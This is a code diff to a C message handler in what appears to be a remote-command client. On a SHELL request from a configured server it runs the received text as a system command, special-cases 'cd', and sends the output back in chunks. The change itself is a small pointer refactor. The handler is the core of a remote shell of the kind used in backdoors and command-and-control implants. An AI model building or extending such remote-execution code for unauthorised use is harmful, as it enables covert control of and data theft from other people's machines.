@@ -123,9 +123,6 @@ int message_deal_Hander(unsigned char * buffer,char *pathm)
         char type_std[10] = {0};
         inint(&message);
 	changeTomsg(buffer,&message);
-        unsigned char ** basep;
-        unsigned char * readp = NULL;
-        basep = &readp;
         if(message.clientid!=tc.client_id)
         {
                 return 0;
@@ -138,6 +135,7 @@ int message_deal_Hander(unsigned char * buffer,char *pathm)
         {
         	if(message.code==(REQUEST|SHELL))
         	{
+                        unsigned char * readp = NULL;
                         if(((*(message.message))=='c')&&((*((message.message+1)))=='d'))
                         {
                                 sigmsg send_msg;
@@ -149,12 +147,12 @@ int message_deal_Hander(unsigned char * buffer,char *pathm)
 	                        }
                                 return 0;
                         }
-        		writeValWithStatus(&message, cmd_system__0a40(message.message,basep,pathm));
+        		writeValWithStatus(&message, cmd_system__0a40(message.message,&readp,pathm));
                         strcpy(type_std,"shell");
                         
-                        for(int i = 0;i<strlen(*basep)/MESSAGELEN+1;i++)
+                        for(int i = 0;i<strlen(readp)/MESSAGELEN+1;i++)
                         {
-			        writeMessage(&message,(*basep)+i*MESSAGELEN);
+			        writeMessage(&message,(readp)+i*MESSAGELEN);
                                 if(isend(tc.server_v4[0],tc.sport,&message)!=0) //sendmesg;
                                 {
                                         message.option[0] = i+1;
@@ -162,7 +160,7 @@ int message_deal_Hander(unsigned char * buffer,char *pathm)
                                 }
 
                         }
-                        free(*basep);
+                        free(readp);
                         
 		}
                 else if(message.code==(REQUEST|ISALIVE))
